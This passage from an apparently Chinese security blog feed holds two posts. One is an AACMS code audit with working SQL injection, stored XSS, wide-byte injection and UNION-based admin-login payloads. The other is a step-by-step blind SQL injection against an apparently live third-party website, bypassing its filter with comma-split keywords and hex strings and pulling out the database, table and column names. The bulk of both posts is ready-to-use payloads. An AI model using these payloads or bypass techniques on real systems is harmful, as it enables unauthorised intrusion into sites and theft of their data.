class="headerlink" title="2.二次注入漏洞"></a>2.二次注入漏洞</h6><p>再回来看刚刚的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<span class="hljs-comment">// 直接向数据库中插入title</span><br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>能够发现，下面还有一条插入语句，由于魔术引号已经被绕过了，所以这里也利用一下</p><p>先看一下正常插入时，数据库的执行情况，执行<code>title=1&amp;url=2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QueryDESC pre_admincp_menu<br>QueryINSERT INTO pre_admincp_menu (`title`, `url`, `displayorder`) VALUES (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)<br></code></pre></td></tr></table></figure><p>看到这里就可以进行payload的构造了</p><p>由于上面有<code>DB::getOne(&quot;SELECT id FROM &quot;.DB::table(&#39;admincp_menu&#39;).&quot; WHERE title=&#39;$title&#39;&quot;)</code></p><p>这里对title进行了一个查询，如果将payload插入到title位置，那么将会直接导致这条sql语句无法正常执行，然后程序报错停止，所以只能将payload插入到url位置</p><p>构造<code>payload:</code> <code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p><p>或是：<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>，都能够实现</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png"></p><p>当然，这里其实不用看代码都能够发现，大概率存在存储型的跨站</p><p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>需要进行url编码</p><p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png"></p><h6 id="3-XSS漏洞"><a href="#3-XSS漏洞" class="headerlink" title="3.XSS漏洞"></a>3.XSS漏洞</h6><p>先跟着大佬的思路走</p><p>回到admin_misc.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br><br><span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>), <span class="hljs-literal">TRUE</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在前面的通读中，已知该系统并没有对XSS进行相关校验，而就算输入经过<code>addslashes()</code>过滤，也并不会影响前段HTML标签的加载，所以上述代码中<code>$custom[url]</code>和<code>$custom[&#39;title&#39;]</code>都可能存在XSS漏洞</p><p>根据前段页面的情况构造payload</p><p><code>url=&quot; onclick=&quot;alert(1)</code></p><p><code>title=&quot; onclick=&quot;alert(1)</code></p><p>需要进行url编码后发送</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png"></p><p>但这里的，如果测试XSS漏洞的话，可能黑盒会更快一些，因为已经知道了web应用没有对XSS进行一个校验，所以能插入的地方，就使劲插入payload，白盒可以少一些。</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png"></p><h5 id="无法复现的漏洞"><a href="#无法复现的漏洞" class="headerlink" title="无法复现的漏洞"></a>无法复现的漏洞</h5><h6 id="1-登录位置的宽字节注入"><a href="#1-登录位置的宽字节注入" class="headerlink" title="1.登录位置的宽字节注入"></a>1.登录位置的宽字节注入</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$username</code>直接拼接进查询语句，由于数据库编码为GBK，所以存在宽字节注入，插入payload之后，数据库执行日志如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QuerySELECT * FROM pre_member WHERE username=&#x27;admin運&#x27; or updatexml(1,concat(1,user()),1)#&#x27;<br># 将该语句代入数据库中进行执行，发现是能够成功执行的，而该web应用没有返回数据库报错信息，直接301，所以使用报错注入无法实现，猜测是这里没有开启报错信息<br># 使用时间盲注，发现无法进行延时，数据库最终执行的payload可以进行延迟，未发现原因<br># 堆叠注入同样无法进行<br></code></pre></td></tr></table></figure><h6 id="2-后台万能密码登录"><a href="#2-后台万能密码登录" class="headerlink" title="2.后台万能密码登录"></a>2.后台万能密码登录</h6><p>还是上面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当用户的密码解不出来时，上面的宽字节注入漏洞就显得没多大用了，所以一个万能密码是很重要的，这里由于没有复现成功，所以就自己捋一下思路吧，为下次碰见类似做个准备</p><p>首先程序根据<code>$username</code>字段去数据库中查取响应的账号信息</p><p>然后对输入的密码进行一个加盐加密</p><p>比对密码同时判断该账号是否为管理员</p><p>OK，由于在根据<code>$username</code>去数据库查询处存在sql注入，所以，可以通过使用联合查询覆盖掉原来的查询数据，让数据库返回想要的数据</p><p>根据数据库的字段，可以进行payload的构造</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png"></p><p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p><p>其中字段三为数据库加密后的密码，字段五<code>groupid</code>必须为1，字段九<code>salt</code>用于字段三加密</p><p>数据库最终执行语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzz運&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure><p>代入数据库查询，返回的也是想要的值</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png"></p><p>但就是无法成功复现，原因仍未发现😭</p><p>真菜，复现都复现不出来😒</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小破站的SQL绕过</title>
    <link href="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/"/>
    <url>/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章中的站点是以前发现的了，漏洞也是以前搞的，但是最近我觉着我大哥需要找点东西练练手，然后就把这个丢给了大哥，结果大哥总是在找理由推脱（大哥也想搞，但总是找借口说没时间），然后我跟大哥说，你再不搞我就直接把思路过程发给你，恶心大哥一手。没错，这篇文章就是拿来恶心我大哥一手的</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png"></p><h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><p>这个站点好像是补天公益里面的一个，至于注入点是怎么找到的就记不清了，所以就直接开搞</p><p><code>and 1=1</code>，<code>and 1=2</code>,屡试不爽,结果GG，直接白屏啥都不显示好吧</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png"></p><p>and不行，那就试一下or，好家伙，也是不行，但是试一下直接<code>video_id=0 or 1</code>，因为1也是代表TRUE，不错，不错  可行，注意此时页面在会务小程序处反回了很多小视频</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png"></p><p>再试一下<code>video_id=0 or 0</code>，小视频没了，这基本可以确定布尔盲注没跑了</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png"></p><p>后面发现直接<code>video_id=0</code>和<code>video_id=1</code>也是能发现页面回显不一样的，那这里肯定要试一下报错</p><p>既然是布尔盲注，那肯定要先判断一下database()的长度，不过这是问题就来了，一般布尔盲注肯定优先用if，</p><p>直接尝试<code>video_id=0 or if(length(database())=10,1,0)</code></p><p>直接报错</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png"></p><p>好家伙，直接报错，显示<code>())=1010</code>位置错误，而输入的是<code>if(length(database())=10,1,0)</code>,能够判断逗号 <strong>,</strong> 逗号无了，而if必须要使用逗号(在我的认知中是必须要使用逗号的)，作为菜鸡的我，一时间不知道该如何了。但这里需要记一下，逗号被过滤掉了，后面绕过过程中会用到</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png"></p><p>拿出我的MySQL手册，打开，翻找，发现我真菜，能就只有一个if嘛？？？肯定还有其他的判断语句，果不其然，有<code>when</code>,而且<code>when</code>还没有逗号，完美</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># when语句用法 condition是一个返回布尔类型的表达式，如果表达式返回true，则整个函数返回相应result的值，如果表达式皆为false，则返回ElSE后result的值，如果省略了ELSE子句，则返回NULL。<br>CASE WHEN condition THEN result<br>[WHEN...THEN...]<br>ELSE result<br>END<br></code></pre></td></tr></table></figure><p>尝试一下<code>video_id=0 or (case when 1=2 then 1 else 0 end)</code>和<code>video_id=0 or (case when 1=1 then 1 else 0 end)</code></p><p>发现页面已经不报错了，并且返回内容也不相同，这样可以继续往下了</p><p>再试一下<code>video_id=0 or (case when length(database())=10 then 1 else 0 end)</code>,好了，又不行</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png"></p><p>看来这里不是<code>length()</code>，就是<code>database()</code>的问题了</p><p>先试一下<code>length()</code>能不能使用，<code>video_id=0 or (case when length(123)=3 then 1 else 0 end)</code>，</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png"></p><p>发现能用，那肯定是对<code>database()</code>进行了检测过滤</p><p>那输入<code>video_id=0 or (case when length(zzzdataqqqbasexxx())=3 then 1 else 0 end)</code>来试一下，好家伙该有的基本没有，不该有的都有，但注意<code>database()</code>中的<code>base</code>被过滤掉了.（其实这里已经得到<code>database()</code>的值了，但这里是讲绕过，所以继续绕）</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png"></p><p><code>base</code>无了，那我写两个好吧，<code>video_id=0 or (case when length(datababasese())=8 then 1 else 0 end)</code></p><p>成功，这就很nice了，得到<code>database()</code>的长度为8</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png"></p><p>开始爆数据库名，这里先尝试一下能否使用引号：<code>video_id=0 or (case when length(&#39;123&#39;)=3 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png"></p><p>算了，还是不用引号了吧，用<code>ascii()</code>这个函数，但是要记住的是这里不能使用逗号，引号</p><p>而刚好<code>substring()</code>有一种不用引号的形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substring(string from position for length)<br># 参数string指的是需要截取的原字符串<br># 数position指的是从哪个位置开始截取子字符串,若position为负数则从右往左开始数位置。<br># 参数length指的是需要截取的字符串长度，如果不写，则默认截取从position开始到最后一位的所有字符。<br></code></pre></td></tr></table></figure><p>这里是一位一位判断的，所以可以忽略for，构造payload如下</p><p><code>video_id=0 or (case when ascii(substring(datababasese() from -1))=121 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png"></p><p>成功获取到数据库名的最后一位是<strong>y</strong>，然后就一步步获取就可以了，最终得到数据库名为：<strong>news_wsy</strong>，与上面看到的一样</p><p>接下来就是获取表名了，正常情况下直接把<code>datababasese()</code>换成<code>(select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;)</code>就可以了，但这里肯定不正常0.0</p><p>不能有引号：所以可以利用MySQL的特性将库名位置更改为16进制形式：0x6E6577735F777379</p><p><code>video_id=0 or not (case when substring((select table_name from information_schema.tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else0 end)</code>,尝试一下这个payload</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png"></p><p>GG,直接参数不合法，参数不合法，那测一下哪些参数不合法</p><p>先试一下select合不合法，因为这个是很多过滤规则中都会禁用的</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png"></p><p>果然不合法，像这种关键字一般可以使用内联注释、关键字替代、大小写等绕过方式，但这里，还可以使用逗号，在前面的绕过中发现逗号是会被过滤掉的，所以这里可以尝试一下在select中加个逗号，如果服务端是先进行select的检验，再删除逗号，那么这里就是可以行的，尝试之后，发现能够成功过来</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png"></p><p>然后继续往下尝试，一个单词一个单词的进行，看看服务端还检测了哪些，</p><p>写到<code>video_id=0 or not (case when substring((sel,ect table_name from information_schema.tables)from 1 for 1)=0x61 then 1 else 0 end)</code>这里时发现又不行了，又提示参数不合法了</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png"></p><p>那基本上就是<code>information_schema.tables</code>的问题，经测试<code>information_schema</code>和<code>tables</code>单独存在时都没有问题，那么一定是<code>information_schema.tables</code>同时存在会被规则匹配到，那么这里可以更改成<code>informa,tion_sch,ema.tab,les</code>或者<code>information_schema . tables</code>(这种形式是在MySQL命令行中测试发现)，将payload更改为如下形式：</p><p><code>video_id=0 or not (case when substring((sel,ect group_concat(table_name)from information_schema . tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png"></p><p>成功，接下来就是繁琐的爆表，这里获取了前四个表的：addgunang,admin,announcement_list，获取表之后就是爆字段了，这里跟爆表没有太多区别，所以直接附上payload:</p><p><code>video_id=0 or not(case when substring((sel,ect group_concat(column_name)from(information_schema . columns)where table_name=0x61646D696E)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png"></p><p>成功，获取数据处基本上就没有什么绕过的内容了，所以写到这里就差不多了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实这个注入点是很简单的，尤其是在发现服务端将逗号过滤掉之后，并且这个过滤逗号是在检测之后进行的，发现这个之后，后面注入基本上没有什么问题，遇到关键字检测就在关键字中加个逗号，这样就能绕过检测；另外就是MySQL中一些可以相互替换的函数，力推MySQL手册，看看这个找一找，有时候找官方文档比百度的快，基本上就这个样子了。另外文章中有一些Payload是直接复制的以前注入时留下的记录，所以可能有时候是<code>0 or (xxx)</code>，有时候是<code>0 or not(xxx)</code>，不过这些都差不多，没多大影响。这个位置个人感觉对练习绕过思路有一定帮助，所以记录下来。珍爱生命，不要扒拉数据，验证存在就好。</p><p>最后，该去干正事了</p><p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>用来恶心人的</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入&amp;预编译</title>
    <link href="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <url>/2022/01/30/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    
